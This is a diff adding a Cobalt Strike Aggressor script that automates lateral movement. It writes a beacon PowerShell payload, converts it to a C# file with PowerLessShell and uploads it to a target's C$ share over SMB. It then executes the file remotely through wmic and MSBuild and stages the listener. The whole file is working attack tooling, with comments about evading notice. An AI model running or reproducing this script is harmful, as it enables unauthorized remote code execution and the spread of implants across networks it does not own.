@@ -1,0 +1,94 @@
+#
+#
+# Aggressor script to simplify using PowerLessShell with Cobalt Strike (https://github.com/Mr-Un1k0d3r/PowerLessShell)
+# Author: MrT-F
+# To use: load script. use macro "wmi_msbuild [target] [listener]" in beacon console
+#
+#
+
+#Register alias
+beacon_command_register("wmi_msbuild", "wmi lateral movement without powershell","Synopsis: wmi_msbuild [target] [listener]", "This uses Mr-Un1k0d3r's PowerLessShell (https://github.com/Mr-Un1k0d3r/PowerLessShell) to execute beacon's powershell payload on a remote system. You will need to copy the PowerLessShell repo to folder PowerLessShell in your cobaltstrike client directory (or edit the $pls_path variable here). Also, the PowerLessShell.py script assumes .NET framework 4.0.30319, so that must exist on the remote system. If it doesn't, edit the script ;)");
+
+sub gen_payload {
+	local('$ps1','$pls_path','$handle');
+	$ps1 = artifact($1, "powershell", true, "x86");
+	#Change this to the path of PowerLessShell (relative to cobaltstrike dir, or just absolute)
+	$pls_path = "PowerLessShell";
+	chdir($pls_path);
+	if (checkError($error))
+	{
+		warn($error);
+	}
+	$handle = openf(">payload.ps1");
+	writeb($handle, $ps1);
+	if (checkError($error))
+	{
+		warn($error);
+	}
+	closef($handle);
+}
+
+sub gen_cs {
+	local('$handle');	
+	$handle	= exec("python PowerLessShell.py", $null, cwd());
+	if (checkError($error))
+	{
+		warn($error);
+	}
+	#stdin to name files
+	writeb($handle,"payload.ps1\n");
+	writeb($handle, "payload.cs\n");
+	#wait for generation to finish
+	wait($handle);
+	closef($handle);
+}
+
+sub wmi_msbuild_func {
+	local('$owd', '$ps1', '$handle', 'payload', '$command_line');
+	#save working dir to restore later
+	$owd = cwd();
+	#ensure listener exists
+	if (listener_info($3) is $null) {
+        	berror($1, "Listener $3 does not exist");
+        	return;
+   	}	
+
+	btask($1, "Tasked Beacon to spawn to to $2 (" . listener_describe($3, $2) . ") via PowerLessShell");
+	#write payload to disk - i re-do this every time in case the listener changes. Probably could be more efficient
+	gen_payload($3);
+	#Use PowerLessShell.py to generate .CS files    
+	gen_cs();
+	#payload.cs.cmd has some nice obfuscation, but we are just going to upload cs file via smb and execute it for now. There are length issues...
+	$handle = openf("payload.cs");	
+	if (checkError($error))
+	{
+		warn($error);
+	}
+	$payload = readb($handle, -1);
+	if (checkError($error))
+	{
+		warn($error);
+	}
+	closef($handle);	
+	bupload_raw($1,'\\\\'.$2.'\\C$\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\testing.cs',$payload);
+	#Built command line and execute - i  spawn cmd rather than directly calling msbuild so we can delete the file when beacon exits (less sneaky, but less cleanup at end of engagement)
+	$command_line = 'wmic /node:"';
+	$command_line .= $2;
+	$command_line .= '" process call create "cmd /c cd C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319 && MSBuild.exe testing.cs && del testing.cs"';
+	println($command_line);
+
+	#Run with beacon's "execute" 
+	bexecute!($1, $command_line);
+	#in case of smb listener, this will link
+	bstage($1, $2, $3);
+	#restore working dir
+	chdir($owd);
+
+}
+
+#alias definition so we can just run this in console
+alias wmi_msbuild {
+
+	wmi_msbuild_func($1, $2, $3);
+
+}
